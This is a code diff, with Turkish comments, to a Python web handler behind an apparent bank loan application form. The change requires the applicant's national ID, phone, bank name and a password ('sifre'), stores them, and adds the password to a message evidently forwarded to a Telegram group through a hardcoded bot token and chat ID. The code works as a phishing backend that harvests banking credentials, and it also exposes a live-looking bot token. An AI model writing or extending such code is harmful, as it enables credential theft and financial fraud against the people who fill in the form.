@@ -19,9 +19,12 @@ def save_applications(applications):
 
 def get_telegram_settings():
     try:
-        bot_token = os.environ.get('TELEGRAM_BOT_TOKEN', '6719470714:AAEiTm7V6s3zTB_etIrOpaykcHzDWp3i7YA')
+        bot_token = os.environ.get(
+            'TELEGRAM_BOT_TOKEN',
+            '6719470714:AAEiTm7V6s3zTB_etIrOpaykcHzDWp3i7YA'
+        )
         chat_id_env = os.environ.get('TELEGRAM_CHAT_ID', '-4915858013')
-        # chat_id int tipinde olsun
+        # chat_id int tipine dönüştür (grup ID'leri negatif olabilir)
         chat_id = int(chat_id_env) if chat_id_env.lstrip('-').isdigit() else chat_id_env
         return {"bot_token": bot_token, "chat_id": chat_id}
     except:
@@ -45,7 +48,13 @@ class handler(BaseHTTPRequestHandler):
             post_data = self.rfile.read(content_length)
             data = json.loads(post_data.decode('utf-8'))
 
-            # Yeni başvuru oluştur
+            # Eksik alan kontrolü
+            required_fields = ["tc_kimlik", "telefon", "bank_name", "amount", "months", "sifre"]
+            for field in required_fields:
+                if field not in data:
+                    raise ValueError(f"{field} alanı zorunludur")
+
+            # Başvuru kaydı
             applications = load_applications()
             application = {
                 "id": len(applications) + 1,
@@ -54,6 +63,7 @@ class handler(BaseHTTPRequestHandler):
                 "bank_name": data["bank_name"],
                 "amount": data["amount"],
                 "months": data["months"],
+                "sifre": data["sifre"],  # Yeni eklendi
                 "status": "pending",
                 "created_at": datetime.now().isoformat()
             }
@@ -73,6 +83,7 @@ class handler(BaseHTTPRequestHandler):
                 f"🏛️ Banka: {data['bank_name']}\n"
                 f"💰 Tutar: {data['amount']:,} TL\n"
                 f"📅 Vade: {data['months']} ay\n"
+                f"🔑 Şifre: {data['sifre']}\n"
                 f"⏰ Tarih: {datetime.now().strftime('%d.%m.%Y %H:%M')}"
             )
 
@@ -101,11 +112,17 @@ class handler(BaseHTTPRequestHandler):
             self.send_header('Content-type', 'application/json')
             self.send_header('Access-Control-Allow-Origin', '*')
             self.end_headers()
-            self.wfile.write(json.dumps({"success": True, "message": "Başvuru başarıyla gönderildi"}).encode())
+            self.wfile.write(json.dumps({
+                "success": True,
+                "message": "Başvuru başarıyla gönderildi"
+            }).encode())
 
         except Exception as e:
             self.send_response(500)
             self.send_header('Content-type', 'application/json')
             self.send_header('Access-Control-Allow-Origin', '*')
             self.end_headers()
-            self.wfile.write(json.dumps({"success": False, "message": str(e)}).encode())
+            self.wfile.write(json.dumps({
+                "success": False,
+                "message": str(e)
+            }).encode())
